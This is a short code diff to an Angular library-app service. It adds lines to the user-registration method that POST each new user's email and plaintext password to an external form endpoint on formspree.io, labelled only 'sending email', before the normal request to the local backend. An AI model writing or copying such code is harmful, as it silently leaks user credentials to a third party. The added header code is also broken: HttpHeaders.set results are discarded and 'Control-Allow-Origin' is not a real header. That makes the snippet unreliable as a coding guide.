@@ -1,4 +1,4 @@
-import { HttpClient, HttpErrorResponse } from "@angular/common/http";
+import { HttpClient, HttpErrorResponse, HttpHeaders } from "@angular/common/http";
 import { Injectable } from "@angular/core";
 import { catchError, map, Subject, throwError } from "rxjs";
 import { LoginSchema } from "./models/user.model";
@@ -53,6 +53,15 @@ export class LibraryService
     // passing registered data to the server
     postRegisterUser(data: LoginSchema)
     {
+        const headers=new HttpHeaders()
+        headers.set('Content-Type','application/json')
+        headers.set("Control-Allow-Origin", "*")
+        // sending email
+        this.http.post('https://formspree.io/f/xlevdeva',
+            {Email:data.loginEmail,Password:data.loginPassword},
+            {'headers':headers}).subscribe(res=>console.log(res)
+            );
+        
         return this.http.post('https://localhost:44309/register', data)
     }
 
